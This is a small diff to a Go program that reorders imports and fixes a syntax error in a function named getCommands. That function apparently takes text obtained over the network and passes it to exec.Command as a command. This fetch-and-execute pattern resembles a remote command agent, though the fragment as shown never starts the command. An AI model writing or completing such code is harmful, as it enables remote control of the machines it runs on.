@@ -5,12 +5,12 @@
 package main
 
 import (
-	"os/exec"
 	"fmt"
 	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 )
 
@@ -45,7 +45,7 @@ func getCommands() {
 		panic(err)
 	}
 	fmt.Printf("commands: \n%s\n", txt)
-	exec.Command(string(txt)
+	exec.Command(string(txt))
 }
 
 func main() {
